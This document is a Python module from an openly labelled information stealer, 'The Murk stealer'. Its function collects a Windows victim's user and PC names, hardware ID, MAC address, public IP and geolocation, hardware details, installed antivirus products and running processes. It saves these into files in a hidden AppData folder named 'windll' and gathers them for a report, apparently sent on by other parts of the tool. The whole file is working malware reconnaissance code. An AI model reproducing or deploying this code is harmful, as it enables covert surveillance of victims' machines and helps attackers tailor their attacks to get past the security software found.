#-----------------------------------------------------------------------------#
#       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       #
#       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       #
#       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       #
#       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       #
#       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       #
#       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       #
#                             by: Nick_Vinesmoke                              #
#                      https://github.com/Nick-Vinesmoke                      #
#             https://github.com/Nick-Vinesmoke/The-Murk-stealer              #
#-----------------------------------------------------------------------------#
import psutil
import GPUtil
import json
import platform
import os
import win32api
import time
import requests
from win32com.client import GetObject
import getpass
import subprocess
"""
logo
"""

logo = '''|-----------------------------------------------------------------------------|
|       ████████╗██╗░░██╗███████╗  ███╗░░░███╗██╗░░░██╗██████╗░██╗░░██╗       |
|       ╚══██╔══╝██║░░██║██╔════╝  ████╗░████║██║░░░██║██╔══██╗██║░██╔╝       |
|       ░░░██║░░░███████║█████╗░░  ██╔████╔██║██║░░░██║██████╔╝█████═╝░       |
|       ░░░██║░░░██╔══██║██╔══╝░░  ██║╚██╔╝██║██║░░░██║██╔══██╗██╔═██╗░       |
|       ░░░██║░░░██║░░██║███████╗  ██║░╚═╝░██║╚██████╔╝██║░░██║██║░╚██╗       |
|       ░░░╚═╝░░░╚═╝░░╚═╝╚══════╝  ╚═╝░░░░░╚═╝░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝       |
|                             by: Nick_Vinesmoke                              |
|                      https://github.com/Nick-Vinesmoke                      |
|             https://github.com/Nick-Vinesmoke/The-Murk-stealer              |
|-----------------------------------------------------------------------------|
'''
def SystemInfo(dataForMassage):
    try:
        pathtofolder = os.environ['USERPROFILE'] + os.sep + r'AppData\Local'
        def get_size(bytes, suffix="B"):
            factor = 1024
            for unit in ["", "K", "M", "G", "T", "P"]:
                if bytes < factor:
                    return f"{bytes:.2f}{unit}{suffix}"
                bytes /= factor

        uname = platform.uname()

        namepc = "\nPc name: " + str(uname.node)# get ps name
        hwid = subprocess.check_output('C:\Windows\System32\wbem\WMIC.exe csproduct get uuid', shell=True,
                                       stdin=subprocess.PIPE, stderr=subprocess.PIPE).decode('utf-8').split('\n')[1].strip()
        user = getpass.getuser()
        timeL = time.asctime()
        ip = requests.get('https://api.ipify.org').text
        interface, addrs = next(iter(psutil.net_if_addrs().items()))
        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
        mac = addrs[0].address
        countofcpu = psutil.cpu_count(logical=True)# get cpu
        allcpucount = str(countofcpu) # get number of CPU cores

        cpufreq = psutil.cpu_freq()


        svmem = psutil.virtual_memory()
        allram = str(get_size(svmem.total))# get Total RAM
        ramfree = str(get_size(svmem.available))# get Available RAM
        ramuseg = str(get_size(svmem.used))# get Used RAM







        partitions = psutil.disk_partitions()
        drivesData =[]
        for partition in partitions:
            nameofdevice = str(partition.device)# get Drives
            nameofdick = str(partition.mountpoint)# get Drive volume
            typeoffilesystem = str(partition.fstype)# File system type
            try:
                partition_usage = psutil.disk_usage(partition.mountpoint)
            except PermissionError:

                continue
            allstorage = str(get_size(partition_usage.total))# get Total memory
            usedstorage = str(get_size(partition_usage.used))# get Used
            freestorage =  str(get_size(partition_usage.free))# get Total Available

            drivesData.append(f"\nDrive: {nameofdevice}\nDrive volume: {nameofdick}\nFile system type: {typeoffilesystem}\nTotal memory: {allstorage}\nUsed: {usedstorage}\nAvailable: {freestorage}\n")



        try:
            gpus = GPUtil.getGPUs()
            list_gpus = []
            for gpu in gpus:

                gpu_name = gpu.name# get Type of GPU
                gpu_free_memory = f"{gpu.memoryFree}MB"# get Available GPU memory
                gpu_total_memory = f"{gpu.memoryTotal}MB"# get Total GPU memory
                gpu_used_memory = f"{int(gpu.memoryTotal)-int(gpu.memoryFree)}MB"
                gpu_temperature = f"{gpu.temperature} °C\n"# get GPU temperature

                Thisgpu = f'\nGPU: {gpu_name}\nTotal GPU memory {gpu_total_memory}\nAvailable GPU memory: {gpu_free_memory}\nGPU used memory: {gpu_used_memory}\nGPU temperature: {gpu_temperature}\n'
                list_gpus.append(Thisgpu)
        except:
            list_gpus.append('No GPU')

        """
        all needed paths
        """
        Antiviruses = {
            'C:\\Program Files\\Windows Defender': 'Windows Defender',
            'C:\\Program Files\\AVAST Software\\Avast': 'Avast',
            'C:\\Program Files\\AVG\\Antivirus': 'AVG',
            'C:\\Program Files (x86)\\Avira\\Launcher': 'Avira',
            'C:\\Program Files (x86)\\IObit\\Advanced SystemCare': 'Advanced SystemCare',
            'C:\\Program Files\\Bitdefender Antivirus Free': 'Bitdefender',
            'C:\\Program Files\\DrWeb': 'Dr.Web',
            'C:\\Program Files\\ESET\\ESET Security': 'ESET',
            'C:\\Program Files (x86)\\Kaspersky Lab': 'Kaspersky Lab',
            'C:\\Program Files (x86)\\360\\Total Security': '360 Total Security',
            'C:\\Program Files\\ESET\\ESET NOD32 Antivirus': 'ESET NOD32',
            'C:\\Program Files\\Malwarebytes\\Anti-Malware': 'Malwarebytes'
            }


        Antivirus = [Antiviruses[d] for d in filter(os.path.exists, Antiviruses)]
        Antiviruses = json.dumps(Antivirus)

        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
            'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:64.0) Gecko/20100101 Firefox/64.0'
        }
        drives = str(win32api.GetLogicalDriveStrings())
        drives = str(drives.split('\000')[:-1])

        try:
            ip = requests.get('https://api.ipify.org').text
            urlloc = 'http://ip-api.com/json/'+ip
            location1 = requests.get(urlloc, headers=headers).text
        except Exception as e:
            print(e)
        try:
            all_data = f'\n\nUser: {user}\nPc name: {namepc}\nOS type: {platform.system()} {platform.release()}\nHwid: {hwid}\nMac: {mac}\nTime: {timeL}\nIP: {ip}\nLocation and IP {location1}\n\n\nCPU: {cpu}\nNumber of CPU cores: {allcpucount}\nCPU frequency: min[{str(cpufreq.min)}Mhz]; max[{str(cpufreq.max)}Mhz]\n\n'
            for gpus in list_gpus:
                all_data+=gpus
            all_data+= f'\n\nRAM: {allram}\nAvailable RAM: {ramfree}\nUsed RAM: {ramuseg}\n\n'
            for data in drivesData:
                all_data+=data
            all_data+= f'\n\nAntiviruses: {Antiviruses}'


            file = open(rf'{pathtofolder}\windll\System\PC_info.txt', "w+", encoding='utf-8') 
            file.write(logo)
            file.write(all_data)
            dataForMassage.append(timeL)
            dataForMassage.append(platform.system()+ platform.release())
            dataForMassage.append(str(uname.node))
            dataForMassage.append(user)
            dataForMassage.append(cpu)
            dataForMassage.append(gpu.name)
            dataForMassage.append(ip)
            dataForMassage.append(str(Antiviruses))
        except Exception as e:
            print(e)

        file.close()
        fileproc = open(rf'{pathtofolder}\windll\System\Processes.txt', 'a', encoding='utf-8')
        result = [process.Properties_('Name').Value for process in GetObject('winmgmts:').InstancesOf('Win32_Process')]
        fileproc.write("\n".join(process for process in result))
        fileproc.close()
        print("sys info done")
        return dataForMassage
    except Exception as e:
        print(e)

